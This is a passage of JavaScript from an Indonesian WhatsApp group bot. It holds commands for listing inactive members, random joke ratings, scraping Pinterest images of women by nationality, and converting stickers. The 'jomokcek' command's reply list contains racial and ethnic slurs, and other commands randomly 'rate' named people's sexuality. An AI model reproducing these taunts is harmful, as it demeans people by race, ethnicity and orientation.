    let member = groupMetadata.participants.map(v => v.id)
    if (!q) {
        var pesan = "Harap aktif di group karena akan ada pembersihan member setiap saat"
    } else {
        var pesan = q
    }
    var sum
    sum = member.length
    var total = 0
    var sider = []
    for (let i = 0; i < sum; i++) {
        let users = m.isGroup ? groupMetadata.participants.find(u => u.id == member[i]) : {}
        if ((typeof global.db.data.users[member[i]] == 'undefined' || milliseconds * 1 - global.db.data.users[member[i]].lastseen > lama) && !users.isAdmin && !users.isSuperAdmin) {
            if (typeof global.db.data.users[member[i]] !== 'undefined') {
            } else {
                total++
                sider.push(member[i])
            }
        }
    }
    if (total == 0) return reply(from, `*Digroup ini tidak terdapat sider.*`, m)
  reply(from, `*${total}/${sum}* anggota group *${await slime.getName(from)}* adalah sider dengan alasan :\n1. Tidak aktif selama lebih dari 7 hari\n2. Baru join tetapi tidak pernah nimbrung\n\n_“${pesan}”_\n\n*LIST SIDER :*\n${sider.map(v => '  ○ @' + v.replace(/@.+/, '' + typeof global.db.data.users[v] == "undefined" ? ' Sider ' : ' Off ' + msToDate(milliseconds * 1 - global.db.data.users[v].lastseen))).join('\n')}`, m, {
        contextInfo: {
            mentionedJid: sider
        }
    })
}

const more = String.fromCharCode(8206)
const readMore = more.repeat(4001)
function msToDate(ms) {
  let d = isNaN(ms) ? '--' : Math.floor(ms / 86400000)
  let h = isNaN(ms) ? '--' : Math.floor(ms / 3600000) % 24
  let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
  let s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60
  if (d == 0 && h == 0 && m == 0) {
        return "Baru Saja"
    } else {
        return [d, 'H ', h, 'J '].map(v => v.toString().padStart(2, 0)).join('')
    }  
}
break
case 'ipbot':
                if (!isCreator) return reply('not for NPC')
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        reply("🔎 My public IP address is: " + ip);
                    })
                })
            break
            case 'rate': {
if (!m.isGroup) return reply(`Fitur Khusus Group!\n\nSilahkan join group bot : https://linktr.ee/slimextzy`)
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
const ra = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const te = ra[Math.floor(Math.random() * ra.length)]
reply(`Rate : ${q}\nJawaban : *${te}%*`)
}
break
case 'gantengcek': case 'cekganteng': {
if (!m.isGroup) return reply(`khusud group`)
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Owner`)
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
const gan = ['10% banyak" perawatan ya bang:v\nCanda Perawatan:v','30% Semangat bang Merawat Dirinya><','20% Semangat Ya bang👍','40% Wahh bang><','50% abang Ganteng deh><','60% Hai Ganteng🐊','70% Hai Ganteng🐊','62% Bang Ganteng><','74% abang ni ganteng deh><','83% Love You abang><','97% Assalamualaikum Ganteng🐊','100% Bang Pake Susuk ya??:v','29% Semangat Bang:)','94% Hai Ganteng><','75% Hai Bang Ganteng','82% wihh abang Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const teng = gan[Math.floor(Math.random() * gan.length)]
reply(`Nama : ${q}\nJawaban : *${teng}*`)
}
break           
case 'jomokcek': case 'cekjomok': {
if (!m.isGroup) return reply(`Fitur Khusus Group!\n\nSilahkan join group bot : https://linktr.ee/slimextzy`)
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Owner`)
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
const gans = ['10% hitam','2% j*wa','h*tam banget wak bjir 😂','jomok ansing jangan di temenin','wah wah sang makhluk h*tam datang','buset wak j*wir 😂','orang suci 🧘🏾‍♂️','j*wa njir 👉🏽💩👈🏽','sang raja h*tam telah datang, mohon tundukan kepala']
const tengs = gans[Math.floor(Math.random() * gans.length)]
reply(`Si ${q} *${tengs}*`)
}
break           
case 'cantikcek': case 'cekcantik': {
if (!m.isGroup) return reply(`Fitur Khusus Group!\n\nSilahkan join group bot : https://linktr.ee/slimextzy`)
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
const can = ['10% banyak" perawatan ya dek:v\nCanda Perawatan:v','30% Semangat Adek Merawat Dirinya><','20% Semangat Ya Adej👍','40% Wahh Adek><','50% adek cantik deh><','60% Hai Cantik🐊','70% Hai Ukhty🐊','62% Adek Cantik><','74% Adek ni cantik deh><','83% Love You Adek><','97% Assalamualaikum Ukhty🐊','100% Adek Pake Susuk ya??:v','29% Semangat Adek:)','94% Hai Cantik><','75% Hai Adek Cantik','82% wihh Adek Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const tik = can[Math.floor(Math.random() * can.length)]
reply(`Nama : ${q}\nJawaban : *${tik}*`)
}
break
case 'sangecek': case 'ceksange': case 'gaycek': case 'cekgay': case 'lesbicek': case 'ceklesbi': {
if (!m.isGroup) return reply(`Fitur Khusus Group!\n\nSilahkan join group bot : https://linktr.ee/slimextzy`)
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
reply(`Nama : ${q}\nJawaban : *${sange}%*`)
}
break
case 'kapankah': {
if (!m.isGroup) return reply(`Fitur Khusus Group!\n\nSilahkan join group bot : https://linktr.ee/slimextzy`)
if (!q) return reply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
reply(`Pertanyaan : ${q}\nJawaban : *${kapankah}*`)
}
break
case 'wangy': {
if (!m.isGroup) return reply(`Fitur Khusus Group!\n\nSilahkan join group bot : https://linktr.ee/slimextzy`)
if (!q) return reply(`Contoh : ${prefix}wangy HuBotZ`)
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
let qq = q.toUpperCase()
let awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
reply(awikwok)
}
break
case 'stickersearch': {
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
if (!text) return reply(`Example : ${m.prefix + command} kururmi`)
var js = await fetch(`https://dikaardnt.com/api/search/sticker?q=${q}`)
var json = await js.json()
reply(`
❗ Note : Bot Will Give Random Results. If the results do not match what you want, please type again ${prefix + command} ${text}

💼 Title : ${json[0].title}
🔗 Link : ${json[0].url}
⭐ Total : ${json[0].total}
`);
}
break
            case 'cekgc': {
            if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
if (!args[0]) return reply("Linknya?")
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return reply("Link Invalid")
slime.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `「 Group Link Yang Di Inspect 」

▸ Nama Group : ${res.content[0].attrs.subject ? res.content[0].attrs.subject : "undefined"}
▸ ID Group : ${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}@g.us
▸ Deskripsi Di Ubah : ${res.content[0].attrs.s_t ? moment(res.content[0].attrs.s_t *1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Pembuat Group : ${res.content[0].attrs.creator ? "@" + res.content[0].attrs.creator.split("@")[0] : "undefined"}
▸ Group Di Buat : ${res.content[0].attrs.creation ? moment(res.content[0].attrs.creation * 1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Total Member : ${res.content[0].attrs.size ? res.content[0].attrs.size : "undefined"} Member

© ${global.fake}`
try {
pp = await slime.profilePictureUrl(res.content[0].attrs.id + "@g.us", "image")
} catch {
pp = "https://tse2.mm.bing.net/th?id=OIP.n1C1oxOvYLLyDIavrBFoNQHaHa&pid=Api&P=0&w=153&h=153"
}
slime.sendFile(from, pp, "", m, { caption: tekse })
})
}
break
 case 'delchat':
if (!isCreator) return reply(`Khusus SlimexTzy`)
await slime.chatModify({delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }]}, from)
reply('sukses menghapus chat')
break
case 'leagueid': case 'idbahasa': case 'kodebahasa':{
reply(`*❲ COUNTRY ID ❳*
    ⏣ •  af: Afrikaans 
    ⏣ •  sq: Albanian
    ⏣ •  ar: Arabic
    ⏣ •  hy: Armenian
    ⏣ •  ca: Catalan 
    ⏣ •  zh: Chinese 
    ⏣ •  zh-cn: Chinese (Mandarin/China)
    ⏣ •  zh-tw: Chinese (Mandarin/Taiwan)
    ⏣ •  zh-yue: Chinese (Cantonese)
    ⏣ •  hr: Croatian
    ⏣ •  cs: Czech
    ⏣ •  da: Danish
    ⏣ •  nl: Dutch
    ⏣ •  en: English    
    ⏣ •  en-au: English (Australia)
    ⏣ •  en-uk: English (United Kingdom)
    ⏣ •  en-us: English (United States) 
    ⏣ •  eo: Esperanto 
    ⏣ •  fi: Finnish 
    ⏣ •  fr: French
    ⏣ •  de: German
    ⏣ •  el: Greek 
    ⏣ •  ht: Haitian Creole 
    ⏣ •  hi: Hindi 
    ⏣ •  hu: Hungarian 
    ⏣ •  is: Icelandic 
    ⏣ •  id: Indonesian 
    ⏣ •  it: Italian
    ⏣ •  ja: Japanese
    ⏣ •  ko: Korean
    ⏣ •  la: Latin
    ⏣ •  lv: Latvian
    ⏣ •  mk: Macedonian
    ⏣ •  no: Norwegian
    ⏣ •  pl: Polish
    ⏣ •  pt: Portuguese
    ⏣ •  pt-br: Portuguese (Brazil)
    ⏣ •  ro: Romanian
    ⏣ •  ru: Russian
    ⏣ •  sr: Serbian
    ⏣ •  sk: Slovak
    ⏣ •  es: Spanish 
    ⏣ •  es-es: Spanish (Spain)
    ⏣ •  es-us: Spanish (United States)
    ⏣ •  sw: Swahili
    ⏣ •  sv: Swedish
    ⏣ •  ta: Tamil
    ⏣ •  th: Thai
    ⏣ •  tr: Turkish
    ⏣ •  vi: Vietnamese 
    ⏣ •  cy: Welse`)
}
break
case 'cecanindo': {
await loading ()
    const createImage = async (url) => {
        const { imageMessage } = await baileys.generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: slime.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 10; i++) {
        const imageUrl = await pinterest('cewek cantik Indonesia');
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [] // Hapus semua tombol
        })
    })));
    const msg = baileys.generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `> Batas 10 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});

    await slime.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
//=================================================
case 'cecanjepang': {

await loading ()
    const createImage = async (url) => {
        const { imageMessage } = await baileys.generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: slime.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 10; i++) {
        const imageUrl = await pinterest('cewek jepang');
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [] // Hapus semua tombol
        })
    })));
    const msg = baileys.generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `> Batas 10 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});

    await slime.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
//=================================================
case 'cecanmalaysia': {

await loading ()
    const createImage = async (url) => {
        const { imageMessage } = await baileys.generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: slime.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 10; i++) {
        const imageUrl = await pinterest('cewek malaysia');
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [] // Hapus semua tombol
        })
    })));
    const msg = baileys.generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `> Batas 10 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});

    await slime.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
//=================================================
case 'cecanhijaber': {

await loading ()
    const createImage = async (url) => {
        const { imageMessage } = await baileys.generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: slime.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 10; i++) {
        const imageUrl = await pinterest('cewek hijab cantik');
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [] // Hapus semua tombol
        })
    })));
    const msg = baileys.generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `> Batas 10 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});

    await slime.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
//=================================================
case 'cecanchina': {

await loading ()
    const createImage = async (url) => {
        const { imageMessage } = await baileys.generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: slime.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 10; i++) {
        const imageUrl = await pinterest('Chinese girl');
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [] // Hapus semua tombol
        })
    })));
    const msg = baileys.generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `> Batas 10 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});

    await slime.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
//=================================================
case 'cecanvietnam': {

await loading ()
    const createImage = async (url) => {
        const { imageMessage } = await baileys.generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: slime.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 10; i++) {
        const imageUrl = await pinterest('Vietnamese girl');
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [] // Hapus semua tombol
        })
    })));
    const msg = baileys.generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `> Batas 10 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});

    await slime.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
//=================================================
case 'cecankorea': {

await loading ()
    const createImage = async (url) => {
        const { imageMessage } = await baileys.generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: slime.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 10; i++) {
        const imageUrl = await pinterest('Korean girl');
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [] // Hapus semua tombol
        })
    })));
    const msg = baileys.generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `> Batas 10 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});

    await slime.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
//=================================================
case 'cecan': {

await loading ()
    const createImage = async (url) => {
        const { imageMessage } = await baileys.generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: slime.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 10; i++) {
        const imageUrl = await pinterest('beautiful girl');
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [] // Hapus semua tombol
        })
    })));
    const msg = baileys.generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `> Batas 10 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});

    await slime.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
//=================================================//

case 'toimage': case 'toimg': {
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await slime.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
slime.sendMessage(from, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}
break
const serialUser = createSerial(20) 
case 'ceksn':
m.reply(`SN : ${serialUser}`)
break
